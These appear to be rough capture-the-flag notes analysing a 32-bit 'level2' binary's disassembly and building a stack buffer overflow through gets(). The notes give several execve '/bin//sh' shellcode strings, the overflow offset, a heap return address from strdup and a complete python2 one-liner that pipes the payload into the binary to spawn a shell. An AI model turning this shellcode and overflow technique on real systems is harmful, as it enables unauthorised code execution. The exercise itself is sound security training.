BY exploring the executable `level2` assembly code we found that the `main` call a function `p` directly without doing anything else:
```assembly
0804853f <main>:
 804853f:       55                      push   %ebp
 8048540:       89 e5                   mov    %esp,%ebp
 8048542:       83 e4 f0                and    $0xfffffff0,%esp
 8048545:       e8 8a ff ff ff          call   80484d4 <p>
 804854a:       c9                      leave
```
and the `p`:
```assembly
080484d4 <p>:
80484d4:       55                      push   %ebp
80484d5:       89 e5                   mov    %esp,%ebp
80484d7:       83 ec 68                sub    $0x68,%esp
80484da:       a1 60 98 04 08          mov    0x8049860,%eax ;[0x8049860 <stdout@@GLIBC_2.0>:   ""]
80484df:       89 04 24                mov    %eax,(%esp)
80484e2:       e8 c9 fe ff ff          call   80483b0 <fflush@plt>
80484e7:       8d 45 b4                lea    -0x4c(%ebp),%eax
80484ea:       89 04 24                mov    %eax,(%esp) # pass the stdout 
80484ed:       e8 ce fe ff ff          call   80483c0 <gets@plt>
80484f2:       8b 45 04                mov    0x4(%ebp),%eax
80484f5:       89 45 f4                mov    %eax,-0xc(%ebp)
80484f8:       8b 45 f4                mov    -0xc(%ebp),%eax
80484fb:       25 00 00 00 b0          and    $0xb0000000,%eax
8048500:       3d 00 00 00 b0          cmp    $0xb0000000,%eax
8048505:       75 20                   jne    8048527 <p+0x53>
8048507:       b8 20 86 04 08          mov    $0x8048620,%eax
804850c:       8b 55 f4                mov    -0xc(%ebp),%edx
804850f:       89 54 24 04             mov    %edx,0x4(%esp)
8048513:       89 04 24                mov    %eax,(%esp)
8048516:       e8 85 fe ff ff          call   80483a0 <printf@plt>
804851b:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
8048522:       e8 a9 fe ff ff          call   80483d0 <_exit@plt>
8048527:       8d 45 b4                lea    -0x4c(%ebp),%eax
804852a:       89 04 24                mov    %eax,(%esp)
804852d:       e8 be fe ff ff          call   80483f0 <puts@plt>
8048532:       8d 45 b4                lea    -0x4c(%ebp),%eax
8048535:       89 04 24                mov    %eax,(%esp)
8048538:       e8 a3 fe ff ff          call   80483e0 <strdup@plt>
804853d:       c9                      leave  
804853e:       c3                      ret
```

intell collection :
```
(gdb) x/s 0x8049860
0x8049860 <stdout@@GLIBC_2.0>:   ""
```

the `p` does allocate a buffer in the stack with the size of 0x68 (104), flush the stdout using the following instruction:
```assembly
    80484da:       a1 60 98 04 08          mov    0x8049860,%eax ;[0x8049860 <stdout@@GLIBC_2.0>:   ""]
    80484df:       89 04 24                mov    %eax,(%esp)
    80484e2:       e8 c9 fe ff ff          call   80483b0 <fflush@plt>
```
after flushing


ltrace ./level2

strdup address -> 0x0804a008
"\x0d\xa0\x04\x08"
segfault happen at offset 75

shellcode -> "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
shellcode -> "\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x11\xcd\x80
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x11\xcd\x80
4+22+49
(python2 -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x11\xcd\x80"+"A"*52+"\x08\xa0\x04\x08"'; cat) | ./level2

(gdb) disassemble p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
>>> print(0x68)
104

[
ebp - address
00:00,;strating addresss ebp-4
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
00:00,
]